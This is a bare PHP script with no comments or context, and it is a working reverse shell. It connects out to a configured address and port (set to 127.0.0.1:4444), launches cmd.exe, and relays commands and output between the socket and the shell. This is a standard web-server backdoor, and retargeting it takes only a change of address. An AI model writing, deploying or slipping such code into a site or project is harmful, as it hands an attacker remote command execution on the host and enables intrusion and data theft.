<?php
set_time_limit(0);
$ip = '127.0.0.1';
$port = 4444;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'cmd.exe';

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    die("Error: $errstr ($errno)");
}

$descriptorspec = array(
    0 => array("pipe", "r"),
    1 => array("pipe", "w"),
    2 => array("pipe", "w")
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
    die("Error: Can't spawn shell");
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

while (true) {
    if (feof($sock)) break;
    if (feof($pipes[1])) break;
    
    $read = array($sock, $pipes[1], $pipes[2]);
    $write = null;
    $except = null;
    
    if (stream_select($read, $write, $except, 0, 200000)) {
        foreach ($read as $fd) {
            if ($fd == $sock) {
                $input = fread($sock, $chunk_size);
                fwrite($pipes[0], $input);
            } elseif ($fd == $pipes[1]) {
                $output = fread($pipes[1], $chunk_size);
                fwrite($sock, $output);
            } elseif ($fd == $pipes[2]) {
                $error = fread($pipes[2], $chunk_size);
                fwrite($sock, $error);
            }
        }
    }
}

fclose($sock);
proc_close($process);
?>